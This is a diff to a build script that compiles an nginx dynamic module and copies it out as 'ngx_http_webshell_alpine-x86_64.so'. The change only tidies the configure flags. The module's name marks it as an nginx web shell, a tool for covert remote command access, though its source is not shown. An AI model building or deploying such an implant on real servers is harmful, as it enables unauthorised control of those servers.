@@ -11,13 +11,15 @@ if ! cd nginx-*; then
 	tar xzvf _nginx-1.10.3.tar.gz && cd nginx-*
 fi
 
-# Compile for nginx-1.10.1 in alpine 3.4 -->
-# sed -i 's/1010000/1010001/g' ./src/core/nginx.h
 
-./configure --add-dynamic-module=../../module --prefix=/var/lib/nginx --sbin-path=/usr/sbin/nginx --conf-path=/etc/nginx/nginx.conf --pid-path=/run/nginx/nginx.pid --lock-path=/run/nginx/nginx.lock --http-client-body-temp-path=/var/lib/nginx/tmp/client_body --http-proxy-temp-path=/var/lib/nginx/tmp/proxy --http-fastcgi-temp-path=/var/lib/nginx/tmp/fastcgi --http-uwsgi-temp-path=/var/lib/nginx/tmp/uwsgi --http-scgi-temp-path=/var/lib/nginx/tmp/scgi --user=nginx --group=nginx --with-ipv6 --with-file-aio --with-pcre-jit --with-http_dav_module --with-http_ssl_module --with-http_stub_status_module --with-http_gzip_static_module --with-http_v2_module --with-http_auth_request_module --with-mail --with-mail_ssl_module --with-cc-opt="-Wno-error"
-
+./configure --add-dynamic-module=../../module --user=nginx --group=nginx \
+	--with-ipv6 --with-file-aio --with-pcre-jit --with-http_dav_module --with-http_ssl_module \
+	--with-http_stub_status_module --with-http_gzip_static_module --with-http_v2_module \
+	--with-http_auth_request_module --with-mail --with-mail_ssl_module \
+	--with-cc-opt="-Wno-error"
 
 make modules 
+
 
 rm -rf ../../bin && mkdir ../../bin
 cp objs/ngx_http_webshell_module.so ../../bin/ngx_http_webshell_alpine-x86_64.so
